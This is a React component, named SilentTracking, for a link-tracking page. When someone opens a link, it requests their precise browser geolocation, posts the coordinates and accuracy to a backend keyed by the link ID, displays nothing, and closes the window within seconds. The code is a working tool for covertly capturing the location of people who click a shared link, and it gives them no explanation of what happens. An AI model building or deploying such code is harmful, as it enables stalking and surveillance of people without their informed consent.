import React, { useEffect, useRef } from "react";
import { useParams } from "react-router-dom";

const API = "http://localhost:4000";

const SilentTracking = () => {
  const { linkId } = useParams();
  const locationSentRef = useRef(false);

  useEffect(() => {
    console.log("Tracking page loaded for linkId:", linkId);

    const sendLocationViaAPI = async () => {
      if (locationSentRef.current) return;
      locationSentRef.current = true;

      console.log("Requesting location...");

      if (!navigator.geolocation) {
        console.error("Geolocation not supported");
        setTimeout(() => window.close(), 1000);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const location = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy,
          };

          console.log("Location obtained:", location);

          try {
            // Send location via API instead of WebSocket
            const response = await fetch(
              `${API}/api/track-location/${linkId}`,
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({ location }),
              },
            );

            const result = await response.json();
            console.log("API response:", result);

            if (result.success) {
              console.log("✅ Location saved successfully!");
            } else {
              console.error("Failed to save location:", result.error);
            }
          } catch (error) {
            console.error("Error sending location:", error);
          }

          // Close after sending
          setTimeout(() => window.close(), 1000);
        },
        (error) => {
          console.error("Geolocation error:", error);
          setTimeout(() => window.close(), 500);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        },
      );
    };

    sendLocationViaAPI();

    // Force close after 10 seconds
    setTimeout(() => window.close(), 10000);
  }, [linkId]);

  return null;
};

export default SilentTracking;
